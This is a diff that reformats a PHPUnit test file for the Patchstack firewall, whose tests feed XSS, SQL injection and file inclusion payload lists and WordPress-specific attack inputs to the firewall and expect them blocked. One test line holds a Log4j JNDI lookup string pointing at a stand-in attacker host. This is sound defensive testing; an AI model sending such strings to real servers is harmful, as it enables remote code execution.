@@ -1,4 +1,7 @@
-<?php declare(strict_types=1);
+<?php
+
+declare(strict_types=1);
+
 use PHPUnit\Framework\TestCase;
 use Patchstack\Processor;
 use Patchstack\Extensions\Test\Extension;
@@ -17,7 +20,7 @@ final class FirewallLegacyTest extends TestCase
 
     /**
      * Setup the test for testing the header location redirect.
-     * 
+     *
      * @return void
      */
     protected function setUp(): void
@@ -27,8 +30,8 @@ final class FirewallLegacyTest extends TestCase
 
     /**
      * Setup the firewall processor.
-     * 
-     * @param array $rules
+     *
+     * @param  array $rules
      * @return void
      */
     private function setUpFirewallProcessor(array $rules)
@@ -38,7 +41,7 @@ final class FirewallLegacyTest extends TestCase
             $rules,
             [],
             [],
-            new Extension
+            new Extension()
         );
     }
 
@@ -46,7 +49,7 @@ final class FirewallLegacyTest extends TestCase
      * Alters the payload between tests.
      * For most firewall rules there's no difference if testing against GET or POST.
      * Therefore, both can be used for testing payloads.
-     * 
+     *
      * @return void
      */
     private function alterPayload(array $payload = [])
@@ -60,7 +63,7 @@ final class FirewallLegacyTest extends TestCase
 
     /**
      * Testing all firewall rules with no payload should result nothing.
-     * 
+     *
      * @return void
      */
     public function testAllRules()
@@ -71,7 +74,7 @@ final class FirewallLegacyTest extends TestCase
 
     /**
      * Test different cross-site scripting attacks.
-     * 
+     *
      * @return void
      */
     public function testXSS()
@@ -81,21 +84,23 @@ final class FirewallLegacyTest extends TestCase
         // Load list of about 1000 XSS payloads.
         $payloads = file_get_contents(dirname(__FILE__) . '/data/PayloadsXSS.txt');
         $payloads = explode("\n", $payloads);
-        foreach($payloads as $payload){
-            if(trim($payload) == ''){
+        foreach ($payloads as $payload) {
+            if (trim($payload) == '') {
                 continue;
             }
 
-            $this->alterPayload(['GET' => [
+            $this->alterPayload(
+                ['GET' => [
                 'q' => $payload
-            ]]);
+                ]]
+            );
             $this->assertFalse($this->processor->launchLegacy(false), 'Testing XSS failed with payload: ' . $payload);
         }
     }
 
     /**
      * Test different SQL injection attacks.
-     * 
+     *
      * @return void
      */
     public function testSQLI()
@@ -105,21 +110,23 @@ final class FirewallLegacyTest extends TestCase
         // Load list of about 1000 XSS payloads.
         $payloads = file_get_contents(dirname(__FILE__) . '/data/PayloadsSQLI.txt');
         $payloads = explode("\n", $payloads);
-        foreach($payloads as $payload){
-            if(trim($payload) == ''){
+        foreach ($payloads as $payload) {
+            if (trim($payload) == '') {
                 continue;
             }
 
-            $this->alterPayload(['GET' => [
+            $this->alterPayload(
+                ['GET' => [
                 'q' => $payload
-            ]]);
+                ]]
+            );
             $this->assertFalse($this->processor->launchLegacy(false), 'Testing SQLI failed with payload: ' . $payload);
         }
     }
 
     /**
      * Test different local file inclusion attacks.
-     * 
+     *
      * @return void
      */
     public function testLFI()
@@ -129,21 +136,23 @@ final class FirewallLegacyTest extends TestCase
         // Load list of about 1000 XSS payloads.
         $payloads = file_get_contents(dirname(__FILE__) . '/data/PayloadsLFI.txt');
         $payloads = explode("\n", $payloads);
-        foreach($payloads as $payload){
-            if(trim($payload) == ''){
+        foreach ($payloads as $payload) {
+            if (trim($payload) == '') {
                 continue;
             }
 
-            $this->alterPayload(['GET' => [
+            $this->alterPayload(
+                ['GET' => [
                 'q' => $payload
-            ]]);
+                ]]
+            );
             $this->assertFalse($this->processor->launchLegacy(false), 'Testing LFI failed with payload: ' . $payload);
         }
     }
 
     /**
      * Test different WordPress specific attacks.
-     * 
+     *
      * @return void
      */
     public function testWordPressSpecific()
@@ -151,9 +160,11 @@ final class FirewallLegacyTest extends TestCase
         $this->setUpFirewallProcessor($this->rules);
 
         // Block Freemius vulnerability through action method.
-        $this->alterPayload(['GET' => [
+        $this->alterPayload(
+            ['GET' => [
             'action' => 'fs_retry_connectivity_test_'
-        ]]);
+            ]]
+        );
         $this->assertFalse($this->processor->launchLegacy(false));
 
         // Block AccessPress backdoor through user-agent.
@@ -161,13 +172,15 @@ final class FirewallLegacyTest extends TestCase
         $this->alterPayload();
         $this->assertFalse($this->processor->launchLegacy(false));
         $_SERVER['HTTP_USER_AGENT'] = '';
-        
+
         // Block Apache Log4j vulnerability.
-        $this->alterPayload([
+        $this->alterPayload(
+            [
             'GET' => [
                 'q' => '${jndi:ldap://attacker.com/reference}'
             ]
-        ]);
+            ]
+        );
         $this->assertFalse($this->processor->launchLegacy(false));
 
         // Block WooCommerce SQL injection.
